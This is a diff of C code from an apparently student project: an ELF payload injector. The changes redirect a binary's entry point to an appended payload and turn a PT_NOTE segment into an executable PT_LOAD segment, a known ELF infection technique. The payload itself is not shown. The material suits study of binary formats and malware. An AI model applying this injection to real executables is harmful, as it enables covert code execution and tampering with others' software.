@@ -6,7 +6,7 @@
 /*   By: afont <afont@student.42.fr>                +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/01/06 10:36:39 by afont             #+#    #+#             */
-/*   Updated: 2026/01/06 15:31:34 by afont            ###   ########.fr       */
+/*   Updated: 2026/01/06 16:01:20 by afont            ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -56,6 +56,7 @@ void	patch_placeholder(char *payload_buffer, Elf64_Addr old_entry, Elf64_Addr ne
 {
 	int				jmp_offset;
 
+	printf("[INFO] patching payload placeholders\n");
 	jmp_offset = (int)(old_entry - (new_vaddr + PAYLOAD_JMP_POS + 5));
 	printf("\n--------------- jump offset calcul ---------------\n");
 	printf("[DEBUG] target (old_entry)                   	: 0x%lx\n", old_entry);
@@ -95,6 +96,45 @@ void	append_payload(t_data *data, Elf64_Addr old_entry, Elf64_Addr new_vaddr)
 	data->injected_map = map;
 }
 
+void	patch_entry(t_data *data, Elf64_Addr new_vaddr)
+{
+	Elf64_Ehdr		*ehdr;
+
+	printf("[INFO] patching ELF entry point to new payload vaddr\n");
+	ehdr = (Elf64_Ehdr *)data->injected_map;
+	printf("[DEBUG] old entry: 0x%lx\n", ehdr->e_entry);
+	ehdr->e_entry = new_vaddr;
+	printf("[DEBUG] new entry: 0x%lx\n", ehdr->e_entry);
+}
+
+void	patch_note_segment(t_data *data, Elf64_Addr new_vaddr)
+{
+	Elf64_Ehdr		*ehdr;
+	Elf64_Phdr		*phdr;
+
+	ehdr = (Elf64_Ehdr *)data->injected_map;
+	phdr = (Elf64_Phdr *)(data->base_map + ehdr->e_phoff);
+	for (int i = 0; i < ehdr->e_phnum; i++)
+	{
+		if (phdr[i].p_type == PT_NOTE)
+		{
+			printf("[DEBUG] phdr[i].p_type: %u, phdr[i].p_offset: %lu, phdr[i].p_vaddr: 0x%lx, phdr[i].p_filesz: %lu, phdr[i].p_memsz: %lu, phdr[i].p_flags: %u",
+				phdr[i].p_type,
+				phdr[i].p_offset,
+				phdr[i].p_vaddr,
+				phdr[i].p_filesz,
+				phdr[i].p_memsz,
+				phdr[i].p_flags);
+			phdr[i].p_type = PT_LOAD;
+			phdr[i].p_offset = data->map_size;
+			phdr[i].p_vaddr = new_vaddr;
+			phdr[i].p_filesz = PAYLOAD_SIZE;
+			phdr[i].p_memsz = PAYLOAD_SIZE;
+			phdr[i].p_flags = PF_R | PF_X;
+		}
+	}
+}
+
 void	inject_payload(t_data *data)
 {
 	Elf64_Ehdr		*ehdr;
@@ -108,4 +148,6 @@ void	inject_payload(t_data *data)
 	phdr = (Elf64_Phdr *)(data->base_map + ehdr->e_phoff);		// program header offset / list of "LOAD, NOTE etc"
 	new_vaddr = get_new_vaddr(data, ehdr, phdr);
 	append_payload(data, old_entry, new_vaddr);
-}
+	patch_entry(data, new_vaddr);
+	patch_note_segment(data, new_vaddr);
+}					
